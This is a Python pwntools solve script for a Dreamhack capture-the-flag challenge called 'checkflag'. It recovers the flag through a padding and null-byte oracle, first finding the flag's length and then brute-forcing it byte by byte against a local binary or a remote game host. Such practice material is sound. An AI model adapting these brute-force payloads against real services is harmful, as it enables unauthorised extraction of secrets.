# Find out length of flag

for i in range(0x40):
    if not REMOTE:
        r = process('./release/checkflag')
    else:
        r = remote('host1.dreamhack.games', 17255)

    sa = r.sendafter

    payload = b'a' * (0x40 - i - 1)
    payload += b'\x00' * (i + 1)

    payload += b'a' * (0x40 - i - 1)

    sa('What\'s the flag? ', payload)

    if b'Correct!' in r.recvline():
        flag_len -= 1
        r.close()
    else:
        r.close()
        break

log.info('length of flag: ' + hex(flag_len))


for i in range(flag_len):
    for char in range(0x20, 0x7f):
        if not REMOTE:
            r = process('./release/checkflag')
        else:
            try:
                r = remote('host1.dreamhack.games', 17255)
            except:
                r = remote('host1.dreamhack.games', 17255) # connection is unstable

        sa = r.sendafter

        payload = b'a' * (flag_len - i - 1)
        payload += bytes([char])
        payload += flag
        payload += b'\x00' * (0x40 - flag_len)

        payload += b'a' * (flag_len - i - 1)
        
        sa('What\'s the flag? ', payload)

        if b'Correct!' in r.recvline():
            flag = bytes([char]) + flag
            print(flag)
            r.close()
            break
        else:
            r.close()